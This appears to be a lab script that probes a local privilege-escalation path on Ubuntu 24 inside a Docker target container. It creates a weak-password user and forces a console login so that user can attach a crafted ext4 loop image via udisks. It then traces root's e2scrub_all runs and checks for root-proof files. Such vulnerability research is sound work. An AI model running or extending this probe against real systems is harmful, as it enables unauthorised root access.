#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'EOS'
set -euo pipefail

id selfauth >/dev/null 2>&1 || useradd -m -s /bin/bash selfauth
echo selfauth:selfauth | chpasswd
usermod -G selfauth selfauth
rm -rf /tmp/active-udisks-e2scrub /home/selfauth/active-udisks-e2scrub
install -d -o selfauth -g selfauth /tmp/active-udisks-e2scrub /home/selfauth/active-udisks-e2scrub

cat >/home/selfauth/active-udisks-e2scrub/probe.sh <<'SH'
#!/bin/bash
set +e
out=/tmp/active-udisks-e2scrub/user.out
exec >"$out" 2>&1
id
tty
echo "XDG_SESSION_ID=$XDG_SESSION_ID"
loginctl show-session "$XDG_SESSION_ID" -p Id -p Seat -p TTY -p Active -p State -p Type -p Class -p Remote
img=/home/selfauth/active-udisks-e2scrub/ext.img
dd if=/dev/zero of="$img" bs=1M count=32 status=none
mkfs.ext4 -q -L 'E2SCRUB_IN' "$img"
udisksctl loop-setup -f "$img" --no-user-interaction
rc=$?
echo "loop_setup_rc=$rc"
udisksctl loop-setup -f "$img" --no-user-interaction 2>&1 | tee /tmp/active-udisks-e2scrub/second-loop.out
loopdev=$(sed -n 's/.* as \\([^.]\\+\\)\\./\\1/p' /tmp/active-udisks-e2scrub/second-loop.out | tail -1)
if [ -n "$loopdev" ]; then
  echo "$loopdev" >/tmp/active-udisks-e2scrub/loopdev
fi
lsblk --pairs --output NAME,FSTYPE,LABEL,UUID,MOUNTPOINT,TYPE,PATH | sed -n '1,160p'
SH
chmod 0755 /home/selfauth/active-udisks-e2scrub/probe.sh
chown -R selfauth:selfauth /home/selfauth/active-udisks-e2scrub

cat >/home/selfauth/.bash_profile <<'SH'
/home/selfauth/active-udisks-e2scrub/probe.sh
exit
SH
chown selfauth:selfauth /home/selfauth/.bash_profile

systemctl stop getty@tty1.service 2>/dev/null || true
timeout 60 openvt -c 1 -s -f -w -- /bin/login -f selfauth || true
systemctl start getty@tty1.service 2>/dev/null || true
loginctl terminate-user selfauth 2>/dev/null || true
rm -f /home/selfauth/.bash_profile

{
  echo "## user active loop setup"
  cat /tmp/active-udisks-e2scrub/user.out 2>&1 || true
  echo "## e2scrub config"
  stat -c '%A %U:%G %n' /etc/e2scrub.conf
  grep -n 'periodic_e2scrub' /etc/e2scrub.conf /sbin/e2scrub_all
  echo "## root lsblk with user loop"
  lsblk --pairs --output NAME,FSTYPE,LABEL,UUID,MOUNTPOINT,TYPE,PATH | sed -n '1,200p'
  echo "## lvs source list"
  lvs -o lv_path --noheadings -S 'lv_active=active,lv_role=public,lv_role!=snapshot,vg_free>=256' 2>&1 || true
  echo "## root e2scrub_all default service mode"
  SERVICE_MODE=1 bash -x /sbin/e2scrub_all -n 2>&1 | sed -n '1,220p'
  echo "## root e2scrub_all all mode"
  bash -x /sbin/e2scrub_all -n -A 2>&1 | sed -n '1,260p'
  echo "## systemd service start"
  systemctl start e2scrub_all.service 2>&1 || true
  journalctl -u e2scrub_all.service -n 40 --no-pager
  echo "## root proof"
  ls -l /tmp/active-udisks-e2scrub-root /root/active-udisks-e2scrub-root 2>&1 || true
} >/tmp/active-udisks-e2scrub/root.out 2>&1

if [ -s /tmp/active-udisks-e2scrub/loopdev ]; then
  loopdev=$(cat /tmp/active-udisks-e2scrub/loopdev)
  udisksctl loop-delete -b "$loopdev" >/dev/null 2>&1 || losetup -d "$loopdev" >/dev/null 2>&1 || true
fi
losetup -a | awk -F: '/active-udisks-e2scrub/ {print $1}' | xargs -r -n1 losetup -d 2>/dev/null || true
rm -rf /home/selfauth/active-udisks-e2scrub /tmp/active-udisks-e2scrub-root /root/active-udisks-e2scrub-root
EOS

mkdir -p ubuntu24-server-lpe/logs
docker exec "$container" cat /tmp/active-udisks-e2scrub/root.out > ubuntu24-server-lpe/logs/active-udisks-e2scrub.out
docker exec "$container" rm -rf /tmp/active-udisks-e2scrub
sed -n '1,260p' ubuntu24-server-lpe/logs/active-udisks-e2scrub.out
